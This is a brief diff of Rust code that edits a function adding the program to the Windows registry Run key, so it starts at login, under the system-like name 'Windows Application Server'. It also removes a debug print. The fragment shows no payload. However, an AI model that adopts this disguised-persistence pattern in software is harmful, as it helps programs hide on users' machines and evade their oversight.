@@ -139,11 +139,9 @@ fn should_run() -> bool {
 
 #[cfg(windows)]
 fn ensure_autorun(path: &str) -> Result<()> {
-    let key = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
-    key.open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;
+    let hkcu = winreg::RegKey::predef(winreg::enums::HKEY_CURRENT_USER);
+    let key = hkcu.open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;
     key.set_value("Windows Application Server".to_string(), &path.to_string())?;
-    let v: String = key.get_value("Windows Application Server".to_string()).unwrap();
-    println!("{:?}, {}, {}", key.enum_keys().map(|x| x.unwrap()).collect::<String>(), path, v);
     Ok(())
 }
 
